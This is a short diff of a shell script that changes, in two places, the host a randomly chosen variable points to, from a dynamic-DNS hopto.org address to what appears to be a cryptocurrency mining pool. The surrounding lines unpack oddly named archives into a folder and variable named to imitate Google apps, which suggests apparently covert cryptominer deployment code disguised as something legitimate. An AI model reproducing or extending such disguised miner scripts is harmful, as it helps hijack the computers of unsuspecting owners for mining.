@@ -28,7 +28,7 @@ tar -xf ./devdeploy84.tar.gz
 
 cd googleapps8474
 
-arr[0]="http://mobile84121274.hopto.org/"
+arr[0]="http://mine.arionumpool.com"
 rand=$[$RANDOM % ${#arr[@]}]
 google841212121274=${arr[$rand]}
 
@@ -104,7 +104,7 @@ tar -xf ./linux847412741274.tar.gz
 
 cd googleapps8474
 
-arr[0]="http://mobile84121274.hopto.org/"
+arr[0]="http://mine.arionumpool.com"
 rand=$[$RANDOM % ${#arr[@]}]
 google841212121274=${arr[$rand]}
 
